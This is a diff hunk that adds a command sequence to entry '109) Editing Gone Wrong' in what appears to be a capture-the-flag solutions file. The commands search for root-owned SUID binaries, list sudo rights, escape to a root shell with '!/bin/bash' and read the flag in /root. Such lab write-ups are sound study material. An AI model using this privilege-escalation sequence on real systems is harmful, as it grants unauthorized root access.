@@ -2076,7 +2076,14 @@ ls -l
 cat flag
 ```
 109) Editing Gone Wrong
-
+```
+find / -user root -perm -4000 -exec ls -ldb {} \;
+sudo -l
+!/bin/bash
+cd /root
+ls -l
+cat flag
+```
 
 
 
